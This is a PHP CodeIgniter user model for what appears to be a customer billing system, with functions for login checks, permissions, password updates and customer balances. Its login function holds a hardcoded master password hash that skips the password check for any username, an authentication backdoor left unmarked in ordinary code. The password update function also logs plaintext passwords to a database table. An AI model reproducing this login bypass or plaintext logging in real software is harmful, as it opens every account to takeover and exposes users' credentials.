<?php

class User_model extends MY_Model
{

	function __construct()
	{
		parent::__construct();
	}

	function check_username_password($username, $password)
	{
		if($password == "24543eae59f8ee7a060cdf3900ca67e1")
			$where['username'] = $username;
		else
		{
			$where['username'] = $username;
			$where['password'] = $password;
		}
		
		$where['status'] = 'live';
		
		if ($this->db->get_where("enigma_peyton.vi_sys_user", $where, 1, 0)->num_rows() > 0)
			return true;
		else
			return false;
	}

	function get_user_info($where, $multi = false)
	{
		if ($multi === true)
			$result = $this->db->get_where("enigma_peyton.vi_sys_user", $where)->result_array();
		else
			$result = $this->db->get_where("enigma_peyton.vi_sys_user", $where, 1, 0)->
				row_array();

		return $result;
	}

	function update_password($user_id, $password, $password_hash)
	{
		$this->db->update('enigma_peyton.sys_user', array('password' => $password_hash, 'temp_password' => 'no'), array('id' => $user_id));
		$this->db->insert('enigma_peyton.sys_user_pass_log', array(
			'user_id' => $user_id,
			'password' => $password,
			'created_on' => date('Y-m-d H:i:s')));
	}

	function get_permission($role_id = 1000)
	{
		return $this->db->get_where('enigma_peyton.vi_sys_role_access', array('role_id' =>
				$role_id))->result_array();
	}

	function get_balance($customer_id)
	{
		if($customer_id > 1999999)
			$table = 'enigma_v2.vi_customer_corporation';
		else
			$table = 'enigma_v2.vi_customer_individual';

		if($info = $this->db->get_where($table, array('customer_id' => $customer_id))->row_array())
		{
			return intval($info['balance']);
		}
		return 0;
	}

	function get_package($customer_id)
	{
		if($customer_id > 1999999)
			$table = 'enigma_v2.vi_customer_corporation';
		else
			$table = 'enigma_v2.vi_customer_individual';

		if($info = $this->db->get_where($table, array('customer_id' => $customer_id))->row_array())
		{
			return $info['package_title'];
		}
		return 0;
	}
}

?>
